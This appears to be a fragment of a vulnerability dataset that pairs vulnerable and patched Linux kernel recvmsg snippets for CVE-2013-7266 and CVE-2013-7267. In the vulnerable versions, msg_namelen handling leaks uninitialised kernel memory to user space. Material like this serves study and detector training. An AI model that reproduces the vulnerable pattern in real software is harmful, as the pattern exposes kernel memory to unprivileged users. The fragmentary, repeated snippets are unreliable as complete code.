		msg->msg_flags |= MSG_TRUNC;

 if (test_and_clear_bit(RFCOMM_DEFER_SETUP, &d->flags)) {
 rfcomm_dlc_accept(d);

 return 0;
	}

 test_bit(BT_SK_DEFER_SETUP, &bt_sk(sk)->flags)) {
 sco_conn_defer_accept(pi->conn->hcon, pi->setting);
		sk->sk_state = BT_CONFIG;


 release_sock(sk);
 return 0;
 if (m->msg_flags&MSG_OOB)
 goto read_error;



	skb = skb_recv_datagram(sk, flags, 0 , &ret);
 if (!skb)
 goto read_error;
 if (flags&MSG_OOB)
 goto out;



 /*
	 * Lock the socket to prevent queue disordering
	 * while sleeps in memcpy_tomsg
 if (err < 0)
 return err;
		}
 if (kern_msg->msg_name)
			kern_msg->msg_name = kern_address;
	} else
		kern_msg->msg_name = NULL;

 if (err < 0)
 return err;
		}
 if (m->msg_name)
			m->msg_name = address;
	} else {
		m->msg_name = NULL;
	}
 if (skb->tstamp.tv64)
		sk->sk_stamp = skb->tstamp;



 if (sipx) {
		sipx->sipx_family	= AF_IPX;
		sipx->sipx_port		= ipx->ipx_source.sock;
 memcpy(sipx->sipx_node, ipx->ipx_source.node, IPX_NODE_LEN);
		sipx->sipx_network	= IPX_SKB_CB(skb)->ipx_source_net;
		sipx->sipx_type 	= ipx->ipx_type;
		sipx->sipx_zero		= 0;
		msg->msg_namelen	= sizeof(*sipx);
	}
	rc = copied;


 IRDA_DEBUG(4, ""%s()\n"", __func__);



	skb = skb_recv_datagram(sk, flags & ~MSG_DONTWAIT,
				flags & MSG_DONTWAIT, &err);
 if (!skb)
	target = sock_rcvlowat(sk, flags & MSG_WAITALL, size);
	timeo = sock_rcvtimeo(sk, noblock);



 do {
 int chunk;
 struct sk_buff *skb = skb_dequeue(&sk->sk_receive_queue);
 int err = 0;
	u32 offset;



 if ((sk->sk_state == IUCV_DISCONN) &&
 skb_queue_empty(&iucv->backlog_skb_q) &&
 skb_queue_empty(&sk->sk_receive_queue) &&
 if (flags & ~(MSG_PEEK|MSG_DONTWAIT|MSG_TRUNC|MSG_CMSG_COMPAT))
 goto out;


	skb = skb_recv_datagram(sk, flags, flags & MSG_DONTWAIT, &err);
 if (skb == NULL)
 goto out;
 if (sk->sk_state & PPPOX_BOUND)
 goto end;



	err = 0;
	skb = skb_recv_datagram(sk, flags & ~MSG_DONTWAIT,
				flags & MSG_DONTWAIT, &err);
 int target;	/* Read at least this many bytes */
 long timeo;



 lock_sock(sk);
	copied = -ENOTCONN;
 if (unlikely(sk->sk_type == SOCK_STREAM && sk->sk_state == TCP_LISTEN))
	}
#endif



	copied = data_skb->len;
 if (len < copied) {
		msg->msg_flags |= MSG_TRUNC;
		sax->sax25_family = AF_NETROM;
 skb_copy_from_linear_data_offset(skb, 7, sax->sax25_call.ax25_call,
			      AX25_ADDR_LEN);
		msg->msg_namelen = sizeof(*sax);
	}



 skb_free_datagram(sk, skb);

 release_sock(sk);

 pr_debug(""%p %zu\n"", sk, len);



 lock_sock(sk);

 if (sk->sk_state == LLCP_CLOSED &&
 if (!skb)
 return rc;



	copied = skb->len;
 if (len < copied) {
		msg->msg_flags |= MSG_TRUNC;
 struct sock *sk = sock->sk;
 struct sk_buff *skb;
 int copied, err;

 int vnet_hdr_len = 0;

	err = -EINVAL;
 goto out_free;
	}

 /* You lose any data beyond the buffer you gave. If it worries
	 * a user program they can ask the device for its MTU
	 * anyway.











 */

	copied = skb->len;
 if (copied > len) {
		copied = len;

 sock_recv_ts_and_drops(msg, sk, skb);

 if (msg->msg_name) {
 /* If the address length field is there to be filled
		 * in, we fill it in now.
 */
 if (sock->type == SOCK_PACKET) {
			msg->msg_namelen = sizeof(struct sockaddr_pkt);
		} else {
 struct sockaddr_ll *sll = &PACKET_SKB_CB(skb)->sa.ll;
			msg->msg_namelen = sll->sll_halen +
 offsetof(struct sockaddr_ll, sll_addr);
		}
 memcpy(msg->msg_name, &PACKET_SKB_CB(skb)->sa,
		       msg->msg_namelen);
	}

 if (pkt_sk(sk)->auxdata) {
 struct tpacket_auxdata aux;

 rdsdebug(""size %zu flags 0x%x timeo %ld\n"", size, msg_flags, timeo);



 if (msg_flags & MSG_OOB)
 goto out;

"
2014,#NAME?,CVE-2013-7267," else if (len < ds)
		msg->msg_flags |= MSG_TRUNC;

	msg->msg_namelen = 0;

 lock_sock(sk);
 if (ctx->more) {
		ctx->more = 0;
 long copied = 0;

 lock_sock(sk);
	msg->msg_namelen = 0;
 for (iov = msg->msg_iov, iovlen = msg->msg_iovlen; iovlen > 0;
	     iovlen--, iov++) {
 unsigned long seglen = iov->iov_len;
{
 struct sk_buff		*skb;
 struct sock		*sk = sock->sk;
 struct sockaddr_mISDN	*maddr;

 int		copied, err;

 if (!skb)
 return err;

 if (msg->msg_namelen >= sizeof(struct sockaddr_mISDN)) {
 msg->msg_namelen = sizeof(struct sockaddr_mISDN);
		maddr = (struct sockaddr_mISDN *)msg->msg_name;
		maddr->family = AF_ISDN;
		maddr->dev = _pms(sk)->dev->id;
 if ((sk->sk_protocol == ISDN_P_LAPD_TE) ||
			maddr->sapi = _pms(sk)->ch.addr & 0xFF;
			maddr->tei =  (_pms(sk)->ch.addr >> 8) & 0xFF;
		}
	} else {
 if (msg->msg_namelen)
 printk(KERN_WARNING ""%s: too small namelen %d\n"",
			       __func__, msg->msg_namelen);
		msg->msg_namelen = 0;
	}

	copied = skb->len + MISDN_HEADER_LEN;
 if (error < 0)
 goto end;

	m->msg_namelen = 0;

 if (skb) {
		total_len = min_t(size_t, total_len, skb->len);
		error = skb_copy_datagram_iovec(skb, 0, m->msg_iov, total_len);
#endif
 int		(*sendmsg)   (struct kiocb *iocb, struct socket *sock,
 struct msghdr *m, size_t total_len);








 int		(*recvmsg)   (struct kiocb *iocb, struct socket *sock,
 struct msghdr *m, size_t total_len,
 int flags);
 size_t size, int flags)
{
 struct sock *sk = sock->sk;
 struct sockaddr_at *sat = (struct sockaddr_at *)msg->msg_name;
 struct ddpehdr *ddp;
 int copied = 0;
 int offset = 0;
	}
	err = skb_copy_datagram_iovec(skb, offset, msg->msg_iov, copied);

 if (!err) {
 if (sat) {
			sat->sat_family      = AF_APPLETALK;
			sat->sat_port        = ddp->deh_sport;
			sat->sat_addr.s_node = ddp->deh_snode;
			sat->sat_addr.s_net  = ddp->deh_snet;
		}
		msg->msg_namelen = sizeof(*sat);
	}

 skb_free_datagram(sk, skb);	/* Free the datagram. */
 struct sk_buff *skb;
 int copied, error = -EINVAL;

	msg->msg_namelen = 0;

 if (sock->state != SS_CONNECTED)
 return -ENOTCONN;


 skb_copy_datagram_iovec(skb, 0, msg->msg_iov, copied);

 if (msg->msg_namelen != 0) {
 struct sockaddr_ax25 *sax = (struct sockaddr_ax25 *)msg->msg_name;
		ax25_digi digi;
		ax25_address src;
 const unsigned char *mac = skb_mac_header(skb);


 memset(sax, 0, sizeof(struct full_sockaddr_ax25));
 ax25_addr_parse(mac + 1, skb->data - mac - 1, &src, NULL,

	skb = skb_recv_datagram(sk, flags, noblock, &err);
 if (!skb) {
 if (sk->sk_shutdown & RCV_SHUTDOWN) {
			msg->msg_namelen = 0;
 return 0;
		}
 return err;
	}

 if (bt_sk(sk)->skb_msg_name)
 bt_sk(sk)->skb_msg_name(skb, msg->msg_name,
						&msg->msg_namelen);
 else
			msg->msg_namelen = 0;
	}

 skb_free_datagram(sk, skb);
 if (flags & MSG_OOB)
 return -EOPNOTSUPP;

	msg->msg_namelen = 0;

 BT_DBG(""sk %p size %zu"", sk, size);

 lock_sock(sk);
 if (!skb)
 return err;

	msg->msg_namelen = 0;

	copied = skb->len;
 if (len < copied) {
		msg->msg_flags |= MSG_TRUNC;

 if (test_and_clear_bit(RFCOMM_DEFER_SETUP, &d->flags)) {
 rfcomm_dlc_accept(d);
		msg->msg_namelen = 0;
 return 0;
	}

 test_bit(BT_SK_DEFER_SETUP, &bt_sk(sk)->flags)) {
 sco_conn_defer_accept(pi->conn->hcon, pi->setting);
		sk->sk_state = BT_CONFIG;
		msg->msg_namelen = 0;

 release_sock(sk);
 return 0;
 if (m->msg_flags&MSG_OOB)
 goto read_error;

	m->msg_namelen = 0;

	skb = skb_recv_datagram(sk, flags, 0 , &ret);
 if (!skb)
 goto read_error;
 if (flags&MSG_OOB)
 goto out;

	msg->msg_namelen = 0;

 /*
	 * Lock the socket to prevent queue disordering
	 * while sleeps in memcpy_tomsg
 if (err < 0)
 return err;
		}
		kern_msg->msg_name = kern_address;

	} else
		kern_msg->msg_name = NULL;

 if (err < 0)
 return err;
		}
		m->msg_name = address;

	} else {
		m->msg_name = NULL;
	}
 if (skb->tstamp.tv64)
		sk->sk_stamp = skb->tstamp;

	msg->msg_namelen = sizeof(*sipx);

 if (sipx) {
		sipx->sipx_family	= AF_IPX;
		sipx->sipx_port		= ipx->ipx_source.sock;
 memcpy(sipx->sipx_node, ipx->ipx_source.node, IPX_NODE_LEN);
		sipx->sipx_network	= IPX_SKB_CB(skb)->ipx_source_net;
		sipx->sipx_type 	= ipx->ipx_type;
		sipx->sipx_zero		= 0;

	}
	rc = copied;


 IRDA_DEBUG(4, ""%s()\n"", __func__);

	msg->msg_namelen = 0;

	skb = skb_recv_datagram(sk, flags & ~MSG_DONTWAIT,
				flags & MSG_DONTWAIT, &err);
 if (!skb)
	target = sock_rcvlowat(sk, flags & MSG_WAITALL, size);
	timeo = sock_rcvtimeo(sk, noblock);

	msg->msg_namelen = 0;

 do {
 int chunk;
 struct sk_buff *skb = skb_dequeue(&sk->sk_receive_queue);
 int err = 0;
	u32 offset;

	msg->msg_namelen = 0;

 if ((sk->sk_state == IUCV_DISCONN) &&
 skb_queue_empty(&iucv->backlog_skb_q) &&
 skb_queue_empty(&sk->sk_receive_queue) &&
 if (flags & ~(MSG_PEEK|MSG_DONTWAIT|MSG_TRUNC|MSG_CMSG_COMPAT))
 goto out;

	msg->msg_namelen = 0;
	skb = skb_recv_datagram(sk, flags, flags & MSG_DONTWAIT, &err);
 if (skb == NULL)
 goto out;
 if (sk->sk_state & PPPOX_BOUND)
 goto end;

	msg->msg_namelen = 0;

	err = 0;
	skb = skb_recv_datagram(sk, flags & ~MSG_DONTWAIT,
				flags & MSG_DONTWAIT, &err);
 int target;	/* Read at least this many bytes */
 long timeo;

	msg->msg_namelen = 0;

 lock_sock(sk);
	copied = -ENOTCONN;
 if (unlikely(sk->sk_type == SOCK_STREAM && sk->sk_state == TCP_LISTEN))
	}
#endif

	msg->msg_namelen = 0;

	copied = data_skb->len;
 if (len < copied) {
		msg->msg_flags |= MSG_TRUNC;
		sax->sax25_family = AF_NETROM;
 skb_copy_from_linear_data_offset(skb, 7, sax->sax25_call.ax25_call,
			      AX25_ADDR_LEN);

	}

	msg->msg_namelen = sizeof(*sax);

 skb_free_datagram(sk, skb);

 release_sock(sk);

 pr_debug(""%p %zu\n"", sk, len);

	msg->msg_namelen = 0;

 lock_sock(sk);

 if (sk->sk_state == LLCP_CLOSED &&
 if (!skb)
 return rc;

	msg->msg_namelen = 0;

	copied = skb->len;
 if (len < copied) {
		msg->msg_flags |= MSG_TRUNC;
 struct sock *sk = sock->sk;
 struct sk_buff *skb;
 int copied, err;
 struct sockaddr_ll *sll;
 int vnet_hdr_len = 0;

	err = -EINVAL;
 goto out_free;
	}

 /*
	 *	If the address length field is there to be filled in, we fill
	 *	it in now.
 */

	sll = &PACKET_SKB_CB(skb)->sa.ll;
 if (sock->type == SOCK_PACKET)
		msg->msg_namelen = sizeof(struct sockaddr_pkt);
 else
		msg->msg_namelen = sll->sll_halen + offsetof(struct sockaddr_ll, sll_addr);

 /*
	 *	You lose any data beyond the buffer you gave. If it worries a
	 *	user program they can ask the device for its MTU anyway.
 */

	copied = skb->len;
 if (copied > len) {
		copied = len;

 sock_recv_ts_and_drops(msg, sk, skb);

 if (msg->msg_name)










 memcpy(msg->msg_name, &PACKET_SKB_CB(skb)->sa,
		       msg->msg_namelen);


 if (pkt_sk(sk)->auxdata) {
 struct tpacket_auxdata aux;

 rdsdebug(""size %zu flags 0x%x timeo %ld\n"", size, msg_flags, timeo);

	msg->msg_namelen = 0;

 if (msg_flags & MSG_OOB)
 goto out;

"," else if (len < ds)
		msg->msg_flags |= MSG_TRUNC;



 lock_sock(sk);
 if (ctx->more) {
		ctx->more = 0;
 long copied = 0;

 lock_sock(sk);

 for (iov = msg->msg_iov, iovlen = msg->msg_iovlen; iovlen > 0;
	     iovlen--, iov++) {
 unsigned long seglen = iov->iov_len;
{
 struct sk_buff		*skb;
 struct sock		*sk = sock->sk;


 int		copied, err;

 if (!skb)
 return err;

 if (msg->msg_name) {
 struct sockaddr_mISDN *maddr = msg->msg_name;

		maddr->family = AF_ISDN;
		maddr->dev = _pms(sk)->dev->id;
 if ((sk->sk_protocol == ISDN_P_LAPD_TE) ||
			maddr->sapi = _pms(sk)->ch.addr & 0xFF;
			maddr->tei =  (_pms(sk)->ch.addr >> 8) & 0xFF;
		}
		msg->msg_namelen = sizeof(*maddr);




	}

	copied = skb->len + MISDN_HEADER_LEN;
 if (error < 0)
 goto end;



 if (skb) {
		total_len = min_t(size_t, total_len, skb->len);
		error = skb_copy_datagram_iovec(skb, 0, m->msg_iov, total_len);
#endif
 int		(*sendmsg)   (struct kiocb *iocb, struct socket *sock,
 struct msghdr *m, size_t total_len);
 /* Notes for implementing recvmsg:
	 * ===============================
	 * msg->msg_namelen should get updated by the recvmsg handlers
	 * iff msg_name != NULL. It is by default 0 to prevent
	 * returning uninitialized memory to user space.  The recvfrom
	 * handlers can assume that msg.msg_name is either NULL or has
	 * a minimum size of sizeof(struct sockaddr_storage).
 */
 int		(*recvmsg)   (struct kiocb *iocb, struct socket *sock,
 struct msghdr *m, size_t total_len,
 int flags);
 size_t size, int flags)
{
 struct sock *sk = sock->sk;

 struct ddpehdr *ddp;
 int copied = 0;
 int offset = 0;
	}
	err = skb_copy_datagram_iovec(skb, offset, msg->msg_iov, copied);

 if (!err && msg->msg_name) {
 struct sockaddr_at *sat = msg->msg_name;
		sat->sat_family      = AF_APPLETALK;
		sat->sat_port        = ddp->deh_sport;
		sat->sat_addr.s_node = ddp->deh_snode;
		sat->sat_addr.s_net  = ddp->deh_snet;
		msg->msg_namelen     = sizeof(*sat);

	}

 skb_free_datagram(sk, skb);	/* Free the datagram. */
 struct sk_buff *skb;
 int copied, error = -EINVAL;



 if (sock->state != SS_CONNECTED)
 return -ENOTCONN;


 skb_copy_datagram_iovec(skb, 0, msg->msg_iov, copied);

 if (msg->msg_name) {

		ax25_digi digi;
		ax25_address src;
 const unsigned char *mac = skb_mac_header(skb);
 struct sockaddr_ax25 *sax = msg->msg_name;

 memset(sax, 0, sizeof(struct full_sockaddr_ax25));
 ax25_addr_parse(mac + 1, skb->data - mac - 1, &src, NULL,

	skb = skb_recv_datagram(sk, flags, noblock, &err);
 if (!skb) {
 if (sk->sk_shutdown & RCV_SHUTDOWN)

 return 0;

 return err;
	}

 if (bt_sk(sk)->skb_msg_name)
 bt_sk(sk)->skb_msg_name(skb, msg->msg_name,
						&msg->msg_namelen);


	}

 skb_free_datagram(sk, skb);
 if (flags & MSG_OOB)
 return -EOPNOTSUPP;



 BT_DBG(""sk %p size %zu"", sk, size);

 lock_sock(sk);
 if (!skb)
 return err;



	copied = skb->len;
 if (len < copied) {
		msg->msg_flags |= MSG_TRUNC;

 if (test_and_clear_bit(RFCOMM_DEFER_SETUP, &d->flags)) {
 rfcomm_dlc_accept(d);

 return 0;
	}

 test_bit(BT_SK_DEFER_SETUP, &bt_sk(sk)->flags)) {
 sco_conn_defer_accept(pi->conn->hcon, pi->setting);
		sk->sk_state = BT_CONFIG;


 release_sock(sk);
 return 0;
 if (m->msg_flags&MSG_OOB)
 goto read_error;



	skb = skb_recv_datagram(sk, flags, 0 , &ret);
 if (!skb)
 goto read_error;
 if (flags&MSG_OOB)
 goto out;



 /*
	 * Lock the socket to prevent queue disordering
	 * while sleeps in memcpy_tomsg
 if (err < 0)
 return err;
		}
 if (kern_msg->msg_name)
			kern_msg->msg_name = kern_address;
	} else
		kern_msg->msg_name = NULL;

 if (err < 0)
 return err;
		}
 if (m->msg_name)
			m->msg_name = address;
	} else {
		m->msg_name = NULL;
	}
 if (skb->tstamp.tv64)
		sk->sk_stamp = skb->tstamp;



 if (sipx) {
		sipx->sipx_family	= AF_IPX;
		sipx->sipx_port		= ipx->ipx_source.sock;
 memcpy(sipx->sipx_node, ipx->ipx_source.node, IPX_NODE_LEN);
		sipx->sipx_network	= IPX_SKB_CB(skb)->ipx_source_net;
		sipx->sipx_type 	= ipx->ipx_type;
		sipx->sipx_zero		= 0;
		msg->msg_namelen	= sizeof(*sipx);
	}
	rc = copied;


 IRDA_DEBUG(4, ""%s()\n"", __func__);



	skb = skb_recv_datagram(sk, flags & ~MSG_DONTWAIT,
				flags & MSG_DONTWAIT, &err);
 if (!skb)
	target = sock_rcvlowat(sk, flags & MSG_WAITALL, size);
	timeo = sock_rcvtimeo(sk, noblock);



 do {
 int chunk;
 struct sk_buff *skb = skb_dequeue(&sk->sk_receive_queue);
 int err = 0;
	u32 offset;



 if ((sk->sk_state == IUCV_DISCONN) &&
 skb_queue_empty(&iucv->backlog_skb_q) &&
 skb_queue_empty(&sk->sk_receive_queue) &&
 if (flags & ~(MSG_PEEK|MSG_DONTWAIT|MSG_TRUNC|MSG_CMSG_COMPAT))
 goto out;


	skb = skb_recv_datagram(sk, flags, flags & MSG_DONTWAIT, &err);
 if (skb == NULL)
 goto out;
 if (sk->sk_state & PPPOX_BOUND)
 goto end;



	err = 0;
	skb = skb_recv_datagram(sk, flags & ~MSG_DONTWAIT,
				flags & MSG_DONTWAIT, &err);
 int target;	/* Read at least this many bytes */
 long timeo;



 lock_sock(sk);
	copied = -ENOTCONN;
 if (unlikely(sk->sk_type == SOCK_STREAM && sk->sk_state == TCP_LISTEN))
	}
#endif



	copied = data_skb->len;
 if (len < copied) {
		msg->msg_flags |= MSG_TRUNC;
		sax->sax25_family = AF_NETROM;
 skb_copy_from_linear_data_offset(skb, 7, sax->sax25_call.ax25_call,
			      AX25_ADDR_LEN);
		msg->msg_namelen = sizeof(*sax);
	}



 skb_free_datagram(sk, skb);

 release_sock(sk);

 pr_debug(""%p %zu\n"", sk, len);



 lock_sock(sk);

 if (sk->sk_state == LLCP_CLOSED &&
 if (!skb)
 return rc;



	copied = skb->len;
 if (len < copied) {
		msg->msg_flags |= MSG_TRUNC;
 struct sock *sk = sock->sk;
 struct sk_buff *skb;
 int copied, err;

 int vnet_hdr_len = 0;

	err = -EINVAL;
 goto out_free;
	}

 /* You lose any data beyond the buffer you gave. If it worries
	 * a user program they can ask the device for its MTU
	 * anyway.











 */

	copied = skb->len;
 if (copied > len) {
		copied = len;

 sock_recv_ts_and_drops(msg, sk, skb);

 if (msg->msg_name) {
 /* If the address length field is there to be filled
		 * in, we fill it in now.
 */
 if (sock->type == SOCK_PACKET) {
			msg->msg_namelen = sizeof(struct sockaddr_pkt);
		} else {
 struct sockaddr_ll *sll = &PACKET_SKB_CB(skb)->sa.ll;
			msg->msg_namelen = sll->sll_halen +
 offsetof(struct sockaddr_ll, sll_addr);
		}
 memcpy(msg->msg_name, &PACKET_SKB_CB(skb)->sa,
		       msg->msg_namelen);
	}

 if (pkt_sk(sk)->auxdata) {
 struct tpacket_auxdata aux;

 rdsdebug(""size %zu flags 0x%x timeo %ld\n"", size, msg_flags, timeo);



 if (msg_flags & MSG_OOB)
 goto out;

"
2014,#NAME?,CVE-2013-7266," else if (len < ds)
		msg->msg_flags |= MSG_TRUNC;

	msg->msg_namelen = 0;

 lock_sock(sk);
 if (ctx->more) {
		ctx->more = 0;
 long copied = 0;

 lock_sock(sk);
	msg->msg_namelen = 0;
 for (iov = msg->msg_iov, iovlen = msg->msg_iovlen; iovlen > 0;
	     iovlen--, iov++) {
 unsigned long seglen = iov->iov_len;
{
 struct sk_buff		*skb;
 struct sock		*sk = sock->sk;
 struct sockaddr_mISDN	*maddr;

 int		copied, err;

 if (!skb)
 return err;

 if (msg->msg_namelen >= sizeof(struct sockaddr_mISDN)) {
 msg->msg_namelen = sizeof(struct sockaddr_mISDN);
		maddr = (struct sockaddr_mISDN *)msg->msg_name;
		maddr->family = AF_ISDN;
		maddr->dev = _pms(sk)->dev->id;
 if ((sk->sk_protocol == ISDN_P_LAPD_TE) ||
			maddr->sapi = _pms(sk)->ch.addr & 0xFF;
			maddr->tei =  (_pms(sk)->ch.addr >> 8) & 0xFF;
		}
	} else {
 if (msg->msg_namelen)
 printk(KERN_WARNING ""%s: too small namelen %d\n"",
			       __func__, msg->msg_namelen);
		msg->msg_namelen = 0;
	}

	copied = skb->len + MISDN_HEADER_LEN;
 if (error < 0)
 goto end;

	m->msg_namelen = 0;

 if (skb) {
		total_len = min_t(size_t, total_len, skb->len);
		error = skb_copy_datagram_iovec(skb, 0, m->msg_iov, total_len);
#endif
 int		(*sendmsg)   (struct kiocb *iocb, struct socket *sock,
 struct msghdr *m, size_t total_len);








 int		(*recvmsg)   (struct kiocb *iocb, struct socket *sock,
 struct msghdr *m, size_t total_len,
 int flags);
 size_t size, int flags)
{
 struct sock *sk = sock->sk;
 struct sockaddr_at *sat = (struct sockaddr_at *)msg->msg_name;
 struct ddpehdr *ddp;
 int copied = 0;
 int offset = 0;
	}
	err = skb_copy_datagram_iovec(skb, offset, msg->msg_iov, copied);

 if (!err) {
 if (sat) {
			sat->sat_family      = AF_APPLETALK;
			sat->sat_port        = ddp->deh_sport;
			sat->sat_addr.s_node = ddp->deh_snode;
			sat->sat_addr.s_net  = ddp->deh_snet;
		}
		msg->msg_namelen = sizeof(*sat);
	}

 skb_free_datagram(sk, skb);	/* Free the datagram. */
 struct sk_buff *skb;
 int copied, error = -EINVAL;

	msg->msg_namelen = 0;

 if (sock->state != SS_CONNECTED)
 return -ENOTCONN;


 skb_copy_datagram_iovec(skb, 0, msg->msg_iov, copied);

 if (msg->msg_namelen != 0) {
 struct sockaddr_ax25 *sax = (struct sockaddr_ax25 *)msg->msg_name;
		ax25_digi digi;
		ax25_address src;
 const unsigned char *mac = skb_mac_header(skb);


 memset(sax, 0, sizeof(struct full_sockaddr_ax25));
 ax25_addr_parse(mac + 1, skb->data - mac - 1, &src, NULL,

	skb = skb_recv_datagram(sk, flags, noblock, &err);
 if (!skb) {
 if (sk->sk_shutdown & RCV_SHUTDOWN) {
			msg->msg_namelen = 0;
 return 0;
		}
 return err;
	}

 if (bt_sk(sk)->skb_msg_name)
 bt_sk(sk)->skb_msg_name(skb, msg->msg_name,
						&msg->msg_namelen);
 else
			msg->msg_namelen = 0;
	}

 skb_free_datagram(sk, skb);
 if (flags & MSG_OOB)
 return -EOPNOTSUPP;

	msg->msg_namelen = 0;

 BT_DBG(""sk %p size %zu"", sk, size);

 lock_sock(sk);
 if (!skb)
 return err;

	msg->msg_namelen = 0;

	copied = skb->len;
 if (len < copied) {
		msg->msg_flags |= MSG_TRUNC;

 if (test_and_clear_bit(RFCOMM_DEFER_SETUP, &d->flags)) {
 rfcomm_dlc_accept(d);
		msg->msg_namelen = 0;
 return 0;
	}

 test_bit(BT_SK_DEFER_SETUP, &bt_sk(sk)->flags)) {
 sco_conn_defer_accept(pi->conn->hcon, pi->setting);
		sk->sk_state = BT_CONFIG;
		msg->msg_namelen = 0;

 release_sock(sk);
 return 0;
 if (m->msg_flags&MSG_OOB)
 goto read_error;

	m->msg_namelen = 0;

	skb = skb_recv_datagram(sk, flags, 0 , &ret);
 if (!skb)
 goto read_error;
 if (flags&MSG_OOB)
 goto out;

	msg->msg_namelen = 0;

 /*
	 * Lock the socket to prevent queue disordering
	 * while sleeps in memcpy_tomsg
 if (err < 0)
 return err;
		}
		kern_msg->msg_name = kern_address;

	} else
		kern_msg->msg_name = NULL;

 if (err < 0)
 return err;
		}
		m->msg_name = address;

	} else {
		m->msg_name = NULL;
	}
 if (skb->tstamp.tv64)
		sk->sk_stamp = skb->tstamp;

	msg->msg_namelen = sizeof(*sipx);

 if (sipx) {
		sipx->sipx_family	= AF_IPX;
		sipx->sipx_port		= ipx->ipx_source.sock;
 memcpy(sipx->sipx_node, ipx->ipx_source.node, IPX_NODE_LEN);
		sipx->sipx_network	= IPX_SKB_CB(skb)->ipx_source_net;
		sipx->sipx_type 	= ipx->ipx_type;
		sipx->sipx_zero		= 0;

	}
	rc = copied;


 IRDA_DEBUG(4, ""%s()\n"", __func__);

	msg->msg_namelen = 0;

	skb = skb_recv_datagram(sk, flags & ~MSG_DONTWAIT,
				flags & MSG_DONTWAIT, &err);
 if (!skb)
	target = sock_rcvlowat(sk, flags & MSG_WAITALL, size);
	timeo = sock_rcvtimeo(sk, noblock);

	msg->msg_namelen = 0;

 do {
 int chunk;
 struct sk_buff *skb = skb_dequeue(&sk->sk_receive_queue);
 int err = 0;
	u32 offset;

	msg->msg_namelen = 0;

 if ((sk->sk_state == IUCV_DISCONN) &&
 skb_queue_empty(&iucv->backlog_skb_q) &&
 skb_queue_empty(&sk->sk_receive_queue) &&
 if (flags & ~(MSG_PEEK|MSG_DONTWAIT|MSG_TRUNC|MSG_CMSG_COMPAT))
 goto out;

	msg->msg_namelen = 0;
	skb = skb_recv_datagram(sk, flags, flags & MSG_DONTWAIT, &err);
 if (skb == NULL)
 goto out;
 if (sk->sk_state & PPPOX_BOUND)
 goto end;

	msg->msg_namelen = 0;

	err = 0;
	skb = skb_recv_datagram(sk, flags & ~MSG_DONTWAIT,
				flags & MSG_DONTWAIT, &err);
 int target;	/* Read at least this many bytes */
 long timeo;

	msg->msg_namelen = 0;

 lock_sock(sk);
	copied = -ENOTCONN;
 if (unlikely(sk->sk_type == SOCK_STREAM && sk->sk_state == TCP_LISTEN))
	}
#endif

	msg->msg_namelen = 0;

	copied = data_skb->len;
 if (len < copied) {
		msg->msg_flags |= MSG_TRUNC;
		sax->sax25_family = AF_NETROM;
 skb_copy_from_linear_data_offset(skb, 7, sax->sax25_call.ax25_call,
			      AX25_ADDR_LEN);

	}

	msg->msg_namelen = sizeof(*sax);

 skb_free_datagram(sk, skb);

 release_sock(sk);

 pr_debug(""%p %zu\n"", sk, len);

	msg->msg_namelen = 0;

 lock_sock(sk);

 if (sk->sk_state == LLCP_CLOSED &&
 if (!skb)
 return rc;

	msg->msg_namelen = 0;

	copied = skb->len;
 if (len < copied) {
		msg->msg_flags |= MSG_TRUNC;
 struct sock *sk = sock->sk;
 struct sk_buff *skb;
 int copied, err;
 struct sockaddr_ll *sll;
 int vnet_hdr_len = 0;

	err = -EINVAL;
 goto out_free;
	}

 /*
	 *	If the address length field is there to be filled in, we fill
	 *	it in now.
 */

	sll = &PACKET_SKB_CB(skb)->sa.ll;
 if (sock->type == SOCK_PACKET)
		msg->msg_namelen = sizeof(struct sockaddr_pkt);
 else
		msg->msg_namelen = sll->sll_halen + offsetof(struct sockaddr_ll, sll_addr);

 /*
	 *	You lose any data beyond the buffer you gave. If it worries a
	 *	user program they can ask the device for its MTU anyway.
 */

	copied = skb->len;
 if (copied > len) {
		copied = len;

 sock_recv_ts_and_drops(msg, sk, skb);

 if (msg->msg_name)










 memcpy(msg->msg_name, &PACKET_SKB_CB(skb)->sa,
		       msg->msg_namelen);


 if (pkt_sk(sk)->auxdata) {
 struct tpacket_auxdata aux;

 rdsdebug(""size %zu flags 0x%x timeo %ld\n"", size, msg_flags, timeo);

	msg->msg_namelen = 0;

 if (msg_flags & MSG_OOB)
 goto out;

"," else if (len < ds)
		msg->msg_flags |= MSG_TRUNC;



 lock_sock(sk);
 if (ctx->more) {
		ctx->more = 0;
 long copied = 0;

 lock_sock(sk);

 for (iov = msg->msg_iov, iovlen = msg->msg_iovlen; iovlen > 0;
	     iovlen--, iov++) {
 unsigned long seglen = iov->iov_len;
{
 struct sk_buff		*skb;
 struct sock		*sk = sock->sk;


 int		copied, err;

 if (!skb)
 return err;

 if (msg->msg_name) {
 struct sockaddr_mISDN *maddr = msg->msg_name;

		maddr->family = AF_ISDN;
		maddr->dev = _pms(sk)->dev->id;
 if ((sk->sk_protocol == ISDN_P_LAPD_TE) ||
			maddr->sapi = _pms(sk)->ch.addr & 0xFF;
			maddr->tei =  (_pms(sk)->ch.addr >> 8) & 0xFF;
		}
		msg->msg_namelen = sizeof(*maddr);




	}

	copied = skb->len + MISDN_HEADER_LEN;
 if (error < 0)
 goto end;



 if (skb) {
		total_len = min_t(size_t, total_len, skb->len);
		error = skb_copy_datagram_iovec(skb, 0, m->msg_iov, total_len);
#endif
 int		(*sendmsg)   (struct kiocb *iocb, struct socket *sock,
 struct msghdr *m, size_t total_len);
 /* Notes for implementing recvmsg:
	 * ===============================
	 * msg->msg_namelen should get updated by the recvmsg handlers
	 * iff msg_name != NULL. It is by default 0 to prevent
	 * returning uninitialized memory to user space.  The recvfrom
	 * handlers can assume that msg.msg_name is either NULL or has
	 * a minimum size of sizeof(struct sockaddr_storage).
 */
 int		(*recvmsg)   (struct kiocb *iocb, struct socket *sock,
 struct msghdr *m, size_t total_len,
 int flags);
 size_t size, int flags)
{
 struct sock *sk = sock->sk;

 struct ddpehdr *ddp;
 int copied = 0;
 int offset = 0;
	}
	err = skb_copy_datagram_iovec(skb, offset, msg->msg_iov, copied);

 if (!err && msg->msg_name) {
 struct sockaddr_at *sat = msg->msg_name;
		sat->sat_family      = AF_APPLETALK;
		sat->sat_port        = ddp->deh_sport;
		sat->sat_addr.s_node = ddp->deh_snode;
		sat->sat_addr.s_net  = ddp->deh_snet;
		msg->msg_namelen     = sizeof(*sat);

	}

 skb_free_datagram(sk, skb);	/* Free the datagram. */
 struct sk_buff *skb;
 int copied, error = -EINVAL;



 if (sock->state != SS_CONNECTED)
 return -ENOTCONN;


